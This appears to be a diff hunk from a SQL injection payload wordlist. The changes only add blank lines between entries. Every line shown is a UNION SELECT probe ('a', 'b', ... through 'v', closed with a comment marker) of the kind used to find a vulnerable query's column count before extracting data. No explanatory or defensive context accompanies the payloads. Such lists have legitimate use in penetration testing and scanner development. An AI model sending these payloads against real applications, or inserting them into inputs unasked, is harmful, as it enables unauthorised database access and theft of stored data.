@@ -8,25 +8,45 @@
 ' UNION SELECT NULL --
 
 ' UNION SELECT 1 --
+
 ' UNION SELECT 'a' --
+
 ' UNION SELECT 'a', 'b' --
+
 ' UNION SELECT 'a', 'b', 'c' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's' --
+
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't' --
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u' --
 ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v' --
